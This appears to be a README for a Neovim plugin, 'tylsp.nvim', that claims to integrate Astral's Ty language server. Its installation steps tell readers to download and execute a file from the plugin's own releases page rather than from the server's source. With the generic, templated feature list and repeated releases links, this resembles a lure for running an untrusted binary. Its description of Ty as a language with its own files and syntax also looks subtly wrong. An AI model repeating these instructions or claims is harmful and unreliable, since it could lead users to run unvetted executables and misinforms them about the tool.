# Tylsp.nvim: A Neovim Plugin for the Ty Language Server Protocol 🌌

![Version](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Release](https://img.shields.io/badge/release-latest-orange.svg)

Welcome to **tylsp.nvim**, a Neovim plugin that integrates the Ty Language Server Protocol (LSP) for an enhanced coding experience. This plugin serves the Astral's Ty language server, providing powerful features to streamline your development workflow.

## Table of Contents

1. [Features](#features)
2. [Installation](#installation)
3. [Usage](#usage)
4. [Configuration](#configuration)
5. [Commands](#commands)
6. [Key Bindings](#key-bindings)
7. [Troubleshooting](#troubleshooting)
8. [Contributing](#contributing)
9. [License](#license)
10. [Contact](#contact)

## Features

- **Syntax Highlighting**: Enjoy clear and colorful syntax highlighting for Ty code.
- **Code Completion**: Get smart code completions based on context.
- **Error Checking**: Identify issues in real-time as you write.
- **Go to Definition**: Quickly navigate to variable and function definitions.
- **Documentation on Hover**: View documentation for functions and types without leaving your code.

## Installation

To install **tylsp.nvim**, follow these steps:

1. Make sure you have Neovim (version 0.5 or later) installed.
2. Install the Ty language server by following the instructions [here](https://github.com/mubeentariq/tylsp.nvim/releases). You will need to download and execute the relevant file.
3. Use your favorite plugin manager to install the plugin. Here are examples for popular managers:

   ### Using `vim-plug`
   ```vim
   Plug 'mubeentariq/tylsp.nvim'
   ```

   ### Using `packer.nvim`
   ```lua
   use 'mubeentariq/tylsp.nvim'
   ```

4. After installation, run `:PlugInstall` or `:PackerSync` to ensure everything is set up.

## Usage

Once installed, **tylsp.nvim** automatically activates when you open a Ty file. The plugin connects to the Ty language server and starts providing LSP features. You can verify that the server is running by checking the status in Neovim.

## Configuration

You can customize **tylsp.nvim** to suit your needs. Here is a basic configuration example:

```lua
require'lspconfig'.ty.setup{
    on_attach = function(client, bufnr)
        -- Key mappings for LSP functions
        local opts = { noremap=true, silent=true }
        vim.api.nvim_set_keymap('n', 'gd', '<cmd>lua vim.lsp.buf.definition()<CR>', opts)
        vim.api.nvim_set_keymap('n', 'K', '<cmd>lua vim.lsp.buf.hover()<CR>', opts)
    end,
}
```

## Commands

Here are some useful commands you can use with **tylsp.nvim**:

- `:LspStart`: Start the Ty language server.
- `:LspStop`: Stop the Ty language server.
- `:LspInfo`: Show information about the current LSP session.

## Key Bindings

You can set up key bindings to enhance your productivity. Here are some recommended bindings:

| Key Combination | Action                         |
|------------------|--------------------------------|
| `gd`             | Go to Definition               |
| `K`              | Show Documentation on Hover    |
| `gr`             | Find References                |
| `:Format`        | Format the current buffer      |

## Troubleshooting

If you encounter issues, here are some steps to resolve them:

1. Ensure that the Ty language server is installed correctly.
2. Check your Neovim version. It should be 0.5 or later.
3. Look at the logs by running `:LspLog` in Neovim to see if there are any errors.
4. If you still have problems, visit the [Releases](https://github.com/mubeentariq/tylsp.nvim/releases) section for updates and fixes.

## Contributing

We welcome contributions to improve **tylsp.nvim**. If you want to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your branch and open a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For any questions or feedback, please reach out to the maintainers:

- GitHub: [mubeentariq](https://github.com/mubeentariq)

Feel free to explore the [Releases](https://github.com/mubeentariq/tylsp.nvim/releases) section for the latest updates and improvements. Thank you for using **tylsp.nvim**!